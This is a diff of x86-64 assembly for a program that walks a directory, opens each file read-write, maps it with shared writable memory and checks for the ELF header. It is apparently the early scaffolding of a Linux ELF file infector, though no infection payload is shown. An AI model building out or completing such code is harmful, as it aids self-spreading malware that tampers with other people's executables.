@@ -37,8 +37,8 @@ SECTION .data
 SECTION .text
 
 _start:
-    push rdx
     push rsp
+    push rdx
     sub  rsp, 5000
     mov  r15, rsp
 
@@ -58,7 +58,7 @@ load_dir:
 
     pop  rdi
     test rax, rax
-    js   exit
+    js   end
     
     mov rdi, rax
     lea rsi, [r15]
@@ -67,7 +67,7 @@ load_dir:
     syscall
 
     test rax, rax
-    js   exit
+    js   end
 
     mov qword [r15 + ST_DIRENT_SIZE_OFF], rax
 
@@ -89,7 +89,7 @@ open_file:
     ; into memory.
     mov rax, SYS_OPEN
     lea rdi, byte [r15 + rcx + DIRENT_OFF_DNAME]
-    mov rsi, O_RDONLY
+    mov rsi, O_RDWR
     xor rdx, rdx
     syscall
 
@@ -108,20 +108,20 @@ open_file:
     xor rax, rax
     mov rax, SYS_MMAP
     mov rdi, 0
-    mov rsi, 8096
-    ; qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
+    mov rsi, qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
     mov rdx, PROT_READ | PROT_WRITE
     mov r10, MAP_SHARED
     mov r8,  qword [r15 + ST_OPEN_FILE_FD]
     mov r9,  0
     syscall
 
-    cmp rax, -1
-    je  exit
+    ; test rax for the range between -1=..=-4095, the error range
+    test rax, rax
+    jns  open_file_end
+    cmp  rax, -4095
+    jge  close_file
 
-    cmp rax, -13
-    je  exit_fail
-
+open_file_end:
     mov qword [r15 + ST_OPEN_FILE_ADDR], rax
 
 is_elf:
@@ -148,23 +148,9 @@ file_loop_continue:
     jne file_loop
 
 end:
-    mov  rdi, 0
-    call exit
-    
-    pop rsp
     pop rdx
-    ret
+    pop rsp
 
-_exit:
+    mov rdi, 0
     mov rax, SYS_EXIT 
 	syscall
-    ret
-
-exit:
-    mov rdi, 0
-    call _exit
-
-exit_fail:
-    mov  rdi, 1
-    call _exit
-    
